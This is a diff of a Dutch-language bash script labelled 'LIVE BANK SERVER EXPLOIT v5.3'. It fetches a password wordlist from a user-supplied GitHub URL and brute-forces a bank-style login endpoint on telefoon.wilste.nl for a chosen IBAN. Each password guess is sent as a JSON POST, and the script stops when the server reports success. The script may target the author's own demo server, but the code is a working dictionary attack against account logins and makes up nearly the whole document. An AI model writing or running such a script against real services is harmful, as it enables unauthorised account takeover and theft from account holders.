@@ -1,86 +1,70 @@
 #!/bin/bash
 
-# Kleuren voor het hacker-uiterlijk
+# Kleuren
 GREEN='\033[0;32m'
 CYAN='\033[0;36m'
 RED='\033[0;31m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
 while true; do
     clear
     echo -e "${GREEN}======================================================"
-    echo -e "          LIVE BANK SERVER EXPLOIT v5.0 (LINUX)"
+    echo -e "          LIVE BANK SERVER EXPLOIT v5.3 (LINUX)"
     echo -e "======================================================${NC}"
     echo ""
 
-    # Stap 1: De Wordlist ophalen
-    echo -e "${CYAN}[1] VOORBEREIDING${NC}"
     read -p "Plak de URL van de GitHub Wordlist (Raw): " urlList
 
-    echo -e "Bezig met ophalen van wordlist..."
-    wordlist=$(curl -s "$urlList")
+    # Haal de lijst op en haal direct alle Windows-tekens (\r) weg
+    raw_data=$(curl -s -L "$urlList" | tr -d '\r')
 
-    if [ -z "$wordlist" ]; then
-        echo -e "${RED}[FOUT] Kon GitHub lijst niet ophalen. Controleer de link!${NC}"
-        read -p "Druk op Enter om opnieuw te proberen..."
+    if [ -z "$raw_data" ]; then
+        echo -e "${RED}[FOUT] Kon lijst niet ophalen.${NC}"
+        read -p "Druk op Enter..."
         continue
     fi
 
-    echo -e "SUCCES: Lijst geladen van GitHub."
-
-    # Stap 2: Doelwit instellen
-    echo ""
-    echo -e "${CYAN}[2] TARGETING${NC}"
     read -p "Voer het doelwit IBAN in: " iban
-    echo ""
-    echo "Verbinding maken met: https://telefoon.wilste.nl..."
-    sleep 1
     echo "------------------------------------------------------"
 
-    # Stap 3: De Aanval
-    apiUrl="https://telefoon.wilste.nl/bank/verify-login"
     gevonden=false
 
-    # Loop door elk woord in de lijst
-    for gok in $wordlist; do
-        # Verwijder onzichtbare tekens (zoals \r van Windows-bestanden)
-        gok=$(echo $gok | tr -d '\r')
+    # We gebruiken een techniek die elk woord strikt apart neemt
+    while read -r line; do
+        # Verwijder alle spaties aan begin/eind
+        gok=$(echo "$line" | xargs)
 
-        echo -n "PROBEREN: $gok ... "
+        # Sla lege regels over
+        [[ -z "$gok" ]] && continue
 
-        # Stuur het JSON verzoek naar de server
-        response=$(curl -s -X POST "$apiUrl" \
+        echo -n "PROBEREN: '$gok' ... "
+
+        # Verstuur naar jouw server
+        # We vangen de respons op en kijken of 'success":true' erin staat
+        response=$(curl -s -X POST "https://telefoon.wilste.nl/bank/verify-login" \
             -H "Content-Type: application/json" \
             -d "{\"iban\":\"$iban\", \"password\":\"$gok\"}")
 
-        # Controleer of de server 'success' teruggeeft
-        if [[ "$response" == *"success"* ]]; then
-            echo -e "${GREEN}[SUCCESS]${NC}"
-            echo ""
-            echo "******************************************************"
-            echo -e "    ${GREEN}[SUCCESS] MATCH GEVONDEN OP DE SERVER!${NC}"
-            echo "    WACHTWOORD: $gok"
-            echo "******************************************************"
+        # STRENGE CONTROLE: Alleen als de server specifiek "success":true teruggeeft
+        if [[ "$response" == *'"success":true'* ]] || [[ "$response" == *'"success": true'* ]]; then
+            echo -e "${GREEN}[MATCH!]${NC}"
+            echo -e "\n******************************************************"
+            echo -e "    WACHTWOORD GEVONDEN: $gok"
+            echo -e "******************************************************"
             gevonden=true
             break
         else
             echo -e "${RED}[GEWEIGERD]${NC}"
         fi
 
-        # Een kleine pauze voor het effect
         sleep 0.1
-    done
+    done <<< "$raw_data"
 
     if [ "$gevonden" = false ]; then
-        echo ""
-        echo -e "${RED}[FAIL] Geen match gevonden. Probeer een andere lijst.${NC}"
+        echo -e "\n${RED}[FAIL] Geen match gevonden in de lijst.${NC}"
     fi
 
     echo ""
-    read -p "Scherm resetten voor een nieuw thema? (j/n): " keuze
-    if [[ "$keuze" != "j" ]]; then
-        break
-    fi
+    read -p "Nieuwe ronde? (j/n): " keuze
+    [[ "$keuze" != "j" ]] && break
 done
-
-echo "Systeem afgesloten."
